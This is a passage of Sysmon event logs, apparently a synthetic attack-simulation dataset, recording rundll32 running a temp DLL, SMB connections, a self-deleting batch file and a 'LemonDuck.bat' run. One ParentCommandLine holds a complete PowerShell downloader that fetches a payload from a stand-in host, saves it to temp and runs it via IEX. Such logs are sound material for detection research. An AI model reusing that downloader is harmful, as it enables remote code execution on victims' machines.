serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 445\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:48:37.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\rundll32.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"445","DestinationPortName":"-","EventReceivedTime":1672667317,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:48:47 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667327,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:48:47.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 445\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:48:47.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\rundll32.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"445","DestinationPortName":"-","EventReceivedTime":1672667327,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:48:57 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667337,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:48:57.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 445\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:48:57.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\rundll32.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"445","DestinationPortName":"-","EventReceivedTime":1672667337,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:49:07 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667347,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:49:07.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 445\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:49:07.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\rundll32.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"445","DestinationPortName":"-","EventReceivedTime":1672667347,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:49:17 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667357,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:49:17.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 445\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:49:17.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\rundll32.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"445","DestinationPortName":"-","EventReceivedTime":1672667357,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:49:27 serhatg.local Microsoft-Windows-Sysmon[2944]: {"EventTime":1672667367,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":154100,"ProcessID":2944,"ThreadID":4064,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-01-02 13:49:27.000000\r\nProcessGuid: {f31bccf6-dc9e-63a9-e80e-000000001200}\r\nProcessId: 1616\r\nImage: C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\r\nFileVersion: 1.3.36.121\r\nDescription: Google Installer\r\nProduct: Google Update\r\nCompany: Google LLC\r\nOriginalFileName: GoogleUpdate.exe\r\nCommandLine: \"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /ua /installsource scheduler\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {f31bccf6-98de-639a-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=E4BF1E4D8477FBF8411E274F95A0D528,SHA256=62F622B022D4D8A52BAF02BCF0C163F6FD046265CC4553D2A8B267F8EDED4B76,IMPHASH=7DF1816239C5BC855600D41210406C5B\r\nParentProcessGuid: {f31bccf6-98e9-639a-2800-000000001200}\r\nParentProcessId: 1688\r\nParentImage: C:\\Windows\\System32\\rundll32.exe\r\nParentCommandLine: C:\\Windows\\system32\\rundll32.exe C:\\Users\\test\\AppData\\Local\\Temp\\fvxens.dll,a /p:fvxens\r\nParentUser: NT AUTHORITY\\SYSTEM","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-01-02 13:49:27.000000","ProcessGuid":"{f31bccf6-dc9e-63a9-e80e-000000001200}","Image":"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe","FileVersion":"1.3.36.121","Description":"Google Installer","Product":"Google Update","Company":"Google LLC","OriginalFileName":"GoogleUpdate.exe","CommandLine":"\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /ua /installsource scheduler","CurrentDirectory":"C:\\Windows\\system32\\","User":"NT AUTHORITY\\SYSTEM","LogonGuid":"{f31bccf6-98de-639a-e703-000000000000}","LogonId":"0x3e7","TerminalSessionId":"0","IntegrityLevel":"System","Hashes":"MD5=E4BF1E4D8477FBF8411E274F95A0D528,SHA256=62F622B022D4D8A52BAF02BCF0C163F6FD046265CC4553D2A8B267F8EDED4B76,IMPHASH=7DF1816239C5BC855600D41210406C5B","ParentProcessGuid":"{f31bccf6-98e9-639a-2800-000000001200}","ParentProcessId":"1688","ParentImage":"C:\\Windows\\System32\\rundll32.exe","ParentCommandLine":"C:\\Windows\\system32\\rundll32.exe C:\\Users\\test\\AppData\\Local\\Temp\\fvxens.dll,a /p:fvxens","ParentUser":"NT AUTHORITY\\SYSTEM","EventReceivedTime":1672667367,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:49:37 serhatg.local Microsoft-Windows-Sysmon[2628]: {"EventTime":1672667377,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":299378,"ProcessID":2628,"ThreadID":2556,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2023-01-02 13:49:37.000000\r\nProcessGuid: {b596e6b5-6377-636d-1e0b-000000000f00}\r\nProcessId: 6140\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: /C ECHO.   \u001B[41mAny misuse of this software will not be the responsibility of the author or of any other collaborator.\u001B[40;97m\r\nCurrentDirectory: C:\\Users\\Administrator\\Downloads\\\r\nUser: SG\\Administrator\r\nLogonGuid: {b596e6b5-5f4c-636d-359d-d90100000000}\r\nLogonId: 0x1D99D35\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA1=DED8FD7F36417F66EB6ADA10E0C0D7C0022986E9,MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18\r\nParentProcessGuid: {b596e6b5-6377-636d-1d0b-000000000f00}\r\nParentProcessId: 6284\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: CMD.EXE /P C:\\Users\\Administrator\\Downloads\\ /M gmer.bat /C \"CMD /C ECHO.   0x1B[41mAny misuse of this software will not be the responsibility of the author or of any other collaborator.0x1B[40;97m\"\r\nParentUser: SG\\Administrator","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2023-01-02 13:49:37.000000","ProcessGuid":"{b596e6b5-6377-636d-1e0b-000000000f00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"/C ECHO.   \u001B[41mAny misuse of this software will not be the responsibility of the author or of any other collaborator.\u001B[40;97m","CurrentDirectory":"C:\\Users\\Administrator\\Downloads\\","User":"SG\\Administrator","LogonGuid":"{b596e6b5-5f4c-636d-359d-d90100000000}","LogonId":"0x1d99d35","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA1=DED8FD7F36417F66EB6ADA10E0C0D7C0022986E9,MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18","ParentProcessGuid":"{b596e6b5-6377-636d-1d0b-000000000f00}","ParentProcessId":"6284","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"CMD.EXE  /P C:\\Users\\Administrator\\Downloads\\ /M gmer.bat /C \"CMD /C ECHO.   0x1B[41mAny misuse of this software will not be the responsibility of the author or of any other collaborator.0x1B[40;97m\"","ParentUser":"SG\\Administrator","EventReceivedTime":1672667377,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:49:47 serhatg.local Microsoft-Windows-Sysmon[2628]: {"EventTime":1672667387,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":299378,"ProcessID":2628,"ThreadID":2556,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2023-01-02 13:49:47.000000\r\nProcessGuid: {b596e6b5-6377-636d-1e0b-000000000f00}\r\nProcessId: 6140\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: /C ECHO.   \u001B[41mAny misuse of this software will not be the responsibility of the author or of any other collaborator.\u001B[40;97m\r\nCurrentDirectory: C:\\Users\\Administrator\\Downloads\\\r\nUser: SG\\Administrator\r\nLogonGuid: {b596e6b5-5f4c-636d-359d-d90100000000}\r\nLogonId: 0x1D99D35\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA1=DED8FD7F36417F66EB6ADA10E0C0D7C0022986E9,MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18\r\nParentProcessGuid: {b596e6b5-6377-636d-1d0b-000000000f00}\r\nParentProcessId: 6284\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: CMD.EXE /C timeout /T 10 /NOBREAK > Nul & Del /f /q\r\nParentUser: SG\\Administrator","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2023-01-02 13:49:47.000000","ProcessGuid":"{b596e6b5-6377-636d-1e0b-000000000f00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"/C ECHO.   \u001B[41mAny misuse of this software will not be the responsibility of the author or of any other collaborator.\u001B[40;97m","CurrentDirectory":"C:\\Users\\Administrator\\Downloads\\","User":"SG\\Administrator","LogonGuid":"{b596e6b5-5f4c-636d-359d-d90100000000}","LogonId":"0x1d99d35","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA1=DED8FD7F36417F66EB6ADA10E0C0D7C0022986E9,MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18","ParentProcessGuid":"{b596e6b5-6377-636d-1d0b-000000000f00}","ParentProcessId":"6284","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"CMD.EXE /C timeout /T 10 /NOBREAK > Nul & Del /f /q","ParentUser":"SG\\Administrator","EventReceivedTime":1672667387,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:49:57 serhatg.local Microsoft-Windows-Sysmon[2625]: {"EventTime":1672667397,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":299378,"ProcessID":2625,"ThreadID":2556,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2023-01-02 13:49:57.000000\r\nProcessGuid: {b596e6b5-6377-636d-1e0b-000000000f00}\r\nProcessId: 6140\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: /C ECHO.   \u001B[41mAny misuse of this software will not be the responsibility of the author or of any other collaborator.\u001B[40;97m\r\nCurrentDirectory: C:\\Users\\Administrator\\Downloads\\\r\nUser: SG\\Administrator\r\nLogonGuid: {b596e6b5-5f4c-636d-359d-d90100000000}\r\nLogonId: 0x1D99D35\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA1=DED8FD7F36417F66EB6ADA10E0C0D7C0022986E9,MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18\r\nParentProcessGuid: {b596e6b5-6377-636d-1d0b-000000000f00}\r\nParentProcessId: 6284\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: CMD.EXE /S /D /c echo try{$localIf=$flase;New-Object Threading.Mutex($true,Global\\eLocalIf,[ref]$localIf)}catch{};$ifmd5=85a6b73fd5b08e0330c10f1e8f8d1158;$ifp=$env:tmp+\\if.bin;$down_url=http://d.example.com;function gmd5($con){[System.Security.Cryptography.MD5]::Create().ComputeHash($con)^|foreach{$s+=$_.ToString(x2)};return $s}if(test-path $ifp){$con_=[System.IO.File]::ReadAllBytes($ifp);$md5_=gmd5 $con_;if($md5_-eq$ifmd5){$noup=1}}if(!$noup){$con=(New-Object Net.WebClient).downloaddata($down_url+/if.bin?^&computer^&FB9C3542-FA73-1B4E-FBA4-60E77BE54AED^&EC:F4:BB:EA:15:88);$t=gmd5 $con;if($t-eq$ifmd5){[System.IO.File]::WriteAllBytes($ifp,$con)}else{$noup=1}}if($noup){$con=$con_;$ifmd5=$md5_}IEX(-join[char[]]$con) MD5:4E2ACF4F8A396486AB4268C94A6A245F)\r\nParentUser: SG\\Administrator","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2023-01-02 13:49:57.000000","ProcessGuid":"{b596e6b5-6377-636d-1e0b-000000000f00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"/C ECHO.   \u001B[41mAny misuse of this software will not be the responsibility of the author or of any other collaborator.\u001B[40;97m","CurrentDirectory":"C:\\Users\\Administrator\\Downloads\\","User":"SG\\Administrator","LogonGuid":"{b596e6b5-5f4c-636d-359d-d90100000000}","LogonId":"0x1d99d35","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA1=DED8FD7F36417F66EB6ADA10E0C0D7C0022986E9,MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18","ParentProcessGuid":"{b596e6b5-6377-636d-1d0b-000000000f00}","ParentProcessId":"6284","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"CMD.EXE /S /D /c echo try{$localIf=$flase;New-Object Threading.Mutex($true,Global\\eLocalIf,[ref]$localIf)}catch{};$ifmd5=85a6b73fd5b08e0330c10f1e8f8d1158;$ifp=$env:tmp+\\if.bin;$down_url=http://d.example.com;function gmd5($con){[System.Security.Cryptography.MD5]::Create().ComputeHash($con)^|foreach{$s+=$_.ToString(x2)};return $s}if(test-path $ifp){$con_=[System.IO.File]::ReadAllBytes($ifp);$md5_=gmd5 $con_;if($md5_-eq$ifmd5){$noup=1}}if(!$noup){$con=(New-Object Net.WebClient).downloaddata($down_url+/if.bin?^&computer^&FB9C3542-FA73-1B4E-FBA4-60E77BE54AED^&EC:F4:BB:EA:15:88);$t=gmd5 $con;if($t-eq$ifmd5){[System.IO.File]::WriteAllBytes($ifp,$con)}else{$noup=1}}if($noup){$con=$con_;$ifmd5=$md5_}IEX(-join[char[]]$con) MD5:4E2ACF4F8A396486AB4268C94A6A245F)","ParentUser":"SG\\Administrator","EventReceivedTime":1672667397,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:50:07 serhatg.local Microsoft-Windows-Sysmon[2621]: {"EventTime":1672667407,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":299378,"ProcessID":2621,"ThreadID":2556,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2023-01-02 13:50:07.000000\r\nProcessGuid: {b596e6b5-6377-636d-1e0b-000000000f00}\r\nProcessId: 6140\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: /C ECHO.   \u001B[41mAny misuse of this software will not be the responsibility of the author or of any other collaborator.\u001B[40;97m\r\nCurrentDirectory: C:\\Users\\Administrator\\Downloads\\\r\nUser: SG\\Administrator\r\nLogonGuid: {b596e6b5-5f4c-636d-359d-d90100000000}\r\nLogonId: 0x1D99D35\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA1=DED8FD7F36417F66EB6ADA10E0C0D7C0022986E9,MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18\r\nParentProcessGuid: {b596e6b5-6377-636d-1d0b-000000000f00}\r\nParentProcessId: 6284\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: CMD.EXE LemonDuck.bat\r\nParentUser: SG\\Administrator","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2023-01-02 13:50:07.000000","ProcessGuid":"{b596e6b5-6377-636d-1e0b-000000000f00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"/C ECHO.   \u001B[41mAny misuse of this software will not be the responsibility of the author or of any other collaborator.\u001B[40;97m","CurrentDirectory":"C:\\Users\\Administrator\\Downloads\\","User":"SG\\Administrator","LogonGuid":"{b596e6b5-5f4c-636d-359d-d90100000000}","LogonId":"0x1d99d35","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA1=DED8FD7F36417F66EB6ADA10E0C0D7C0022986E9,MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18","ParentProcessGuid":"{b596e6b5-6377-636d-1d0b-000000000f00}","ParentProcessId":"6284","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"CMD.EXE LemonDuck.bat","ParentUser":"SG\\Administrator","EventReceivedTime":1672667407,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
